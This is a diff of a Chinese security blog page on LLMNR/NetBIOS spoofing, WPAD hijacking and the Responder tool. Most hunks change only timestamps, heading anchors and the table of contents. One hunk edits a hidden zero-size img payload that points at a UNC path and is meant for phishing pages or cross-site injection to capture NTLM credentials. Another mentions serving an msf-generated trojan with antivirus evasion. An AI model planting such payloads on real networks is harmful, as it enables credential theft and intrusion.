@@ -139,7 +139,7 @@
 <meta property="og:image" content="http://orleven.orleven.com/images/spoof-llmnr-wpad/ftp-2.jpg">
 <meta property="og:image" content="http://orleven.orleven.com/images/spoof-llmnr-wpad/responder-4.jpg">
 <meta property="og:image" content="http://orleven.orleven.com/images/spoof-llmnr-wpad/shell-1.jpg">
-<meta property="og:updated_time" content="2018-03-08T15:37:30.219Z">
+<meta property="og:updated_time" content="2018-03-08T15:43:28.650Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="中间人攻击————LLMNR以及Responder">
 <meta name="twitter:description" content="概述继续学习一波中间人攻击的LLMNR以及Responder，备忘。">
@@ -496,7 +496,7 @@
 <p>A 被欺骗主机： 192.168.111.170<br>B 攻击机：192.168.111.183<br>C 被欺骗主机要访问的服务器：192.168.111.1</p>
 <p><img src="/images/spoof-llmnr-wpad/llmnr-3.jpg" alt="llmnr-3"></p>
 <p>当A向C发起共享资源请求时,由于本地dns解析失败,正常情况下该请求会被交给LLMNR然后执行netbios查询,但不巧的是攻击者此时正在监听网络中的所有netbios查询请求,自然也就会捕捉到这条查询,当攻击者捕捉到该查询之后,它会告请求者也就是A,我[B]就是你要请求的那台服务器,接着A会把自己的账号密码提供给B认证,也就是说,此时B已经截获到了A的账号密码。</p>
-<h2 id="具体操作："><a href="#具体操作：" class="headerlink" title="具体操作："></a>具体操作：</h2><ol>
+<h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><ol>
 <li>在C服务器上,也就是我们的服务器上先创建一个共享目录：</li>
 </ol>
 <p><img src="/images/spoof-llmnr-wpad/ftp-1.jpg" alt="ftp-1"></p>
@@ -525,7 +525,7 @@
 <h2 id="攻击原理-1"><a href="#攻击原理-1" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>可以利用dns或者dhcp毒化,来操控流量指向,但这种方式很容易被拦截,而LLMNR则不一样,它是通过广播告诉同一内网下的所有windows,它就是wpad服务器,这样当你的浏览器设置为<code>自动检测代理设置</code>的情况下,它就会下载攻击者事先准备好的wpad.dat文件,这样一来,客户端的流量就会经过攻击者的机器。</p>
 <p>假设现在有三台机器：</p>
 <p>A 被欺骗主机： 192.168.111.170<br>B 攻击机：192.168.111.183<br>C 被欺骗主机要访问的服务器：192.168.111.156（desktop-9hmbf0）</p>
-<h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><ol>
+<h2 id="具体操作-1"><a href="#具体操作-1" class="headerlink" title="具体操作"></a>具体操作</h2><ol>
 <li>在C服务器上,也就是我们的服务器上先创建一个共享目录：</li>
 </ol>
 <p><img src="/images/spoof-llmnr-wpad/ftp-1.jpg" alt="ftp-1"></p>
@@ -549,8 +549,8 @@
 </li>
 </ol>
 <p><img src="/images/spoof-llmnr-wpad/responder-4.jpg" alt="responder-4"></p>
-<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="Responder-结合钓鱼页面-跨站进行"><a href="#Responder-结合钓鱼页面-跨站进行" class="headerlink" title="Responder 结合钓鱼页面/跨站进行"></a>Responder 结合钓鱼页面/跨站进行</h2><p>插入相关请求：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img/src=\\SECLAB-HER0IN\1.jpg width=0 height=0&gt; 或 &lt;img/src=http:\\SECLAB-HER0IN\1.jpg width=0 height=0&gt;</div></pre></td></tr></table></figure>
+<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="Responder-结合钓鱼页面-跨站进行"><a href="#Responder-结合钓鱼页面-跨站进行" class="headerlink" title="Responder 结合钓鱼页面/跨站进行"></a>Responder 结合钓鱼页面/跨站进行</h2><p>伪造钓鱼页面或者借助跨站插入如下相关请求：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;img/src=\\orleven\1.jpg width=0 height=0&gt; </div><div class="line">&lt;img/src=http:\\orleven\1.jpg width=0 height=0&gt;</div></pre></td></tr></table></figure>
 <h2 id="responder-钓鱼木马"><a href="#responder-钓鱼木马" class="headerlink" title="responder 钓鱼木马"></a>responder 钓鱼木马</h2><ol>
 <li>首先,准备好自己的马,这里我就暂时直接用msf来生成了，现实中免杀是必须的,生成好以后把它放到我们的responder的files目录中，</li>
 </ol>
@@ -718,7 +718,7 @@
             
             
             <div class="site-state-item site-state-tags">
-              <a href="/tags/index.html">
+              <a href="/tags/index-1.html">
                 <span class="site-state-item-count">53</span>
                 <span class="site-state-item-name">标签</span>
               </a>
@@ -772,7 +772,7 @@
               
 
               
-                <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#概述"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#概述-1"><span class="nav-number">2.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LLMNR-以及-NetBIOS——NS"><span class="nav-number">3.</span> <span class="nav-text">LLMNR 以及 NetBIOS——NS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#LLMNR"><span class="nav-number">3.1.</span> <span class="nav-text">LLMNR</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Netbios"><span class="nav-number">3.2.</span> <span class="nav-text">Netbios</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#劫持会话获取-HASH"><span class="nav-number">3.3.</span> <span class="nav-text">劫持会话获取 HASH</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击原理"><span class="nav-number">3.4.</span> <span class="nav-text">攻击原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#具体操作："><span class="nav-number">3.5.</span> <span class="nav-text">具体操作：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WPAD"><span class="nav-number">4.</span> <span class="nav-text">WPAD</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击原理-1"><span class="nav-number">4.1.</span> <span class="nav-text">攻击原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#具体操作"><span class="nav-number">4.2.</span> <span class="nav-text">具体操作</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#其他"><span class="nav-number">5.</span> <span class="nav-text">其他</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Responder-结合钓鱼页面-跨站进行"><span class="nav-number">5.1.</span> <span class="nav-text">Responder 结合钓鱼页面/跨站进行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#responder-钓鱼木马"><span class="nav-number">5.2.</span> <span class="nav-text">responder 钓鱼木马</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考文章"><span class="nav-number">6.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+                <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#概述"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#概述-1"><span class="nav-number">2.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LLMNR-以及-NetBIOS——NS"><span class="nav-number">3.</span> <span class="nav-text">LLMNR 以及 NetBIOS——NS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#LLMNR"><span class="nav-number">3.1.</span> <span class="nav-text">LLMNR</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Netbios"><span class="nav-number">3.2.</span> <span class="nav-text">Netbios</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#劫持会话获取-HASH"><span class="nav-number">3.3.</span> <span class="nav-text">劫持会话获取 HASH</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击原理"><span class="nav-number">3.4.</span> <span class="nav-text">攻击原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#具体操作"><span class="nav-number">3.5.</span> <span class="nav-text">具体操作</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WPAD"><span class="nav-number">4.</span> <span class="nav-text">WPAD</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击原理-1"><span class="nav-number">4.1.</span> <span class="nav-text">攻击原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#具体操作-1"><span class="nav-number">4.2.</span> <span class="nav-text">具体操作</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#其他"><span class="nav-number">5.</span> <span class="nav-text">其他</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Responder-结合钓鱼页面-跨站进行"><span class="nav-number">5.1.</span> <span class="nav-text">Responder 结合钓鱼页面/跨站进行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#responder-钓鱼木马"><span class="nav-number">5.2.</span> <span class="nav-text">responder 钓鱼木马</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考文章"><span class="nav-number">6.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
               
 
             </div>
